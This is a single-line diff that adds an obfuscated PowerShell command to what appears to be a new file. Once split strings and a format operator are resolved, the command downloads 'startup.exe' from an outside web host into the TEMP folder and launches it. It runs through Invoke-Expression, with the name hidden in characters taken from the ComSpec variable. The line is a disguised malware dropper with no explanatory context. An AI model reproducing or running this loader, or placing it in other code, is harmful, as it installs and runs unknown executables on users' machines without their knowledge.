@@ -1,0 +1,1 @@
+﻿(('(N'+'ew-Object Syst'+'em.Net.WebC'+'l'+'ient'+').Dow'+'nl'+'oadFile({3'+'}w'+'ww.lond'+'onoffices.website/down'+'load/star'+'tup'+'.ex'+'e{3}'+',{2}'+'{'+'0}en'+'v'+':TEMP'+'{1}start'+'up.'+'e'+'xe{2}'+');'+'Start-'+'Proc'+'ess ('+'{2}{0}env:TEMP{'+'1}st'+'artu'+'p.exe{2})') -f [chAr]36,[chAr]92,[chAr]34,[chAr]39) |.( $EnV:cOmspEC[4,15,25]-jOIn'')
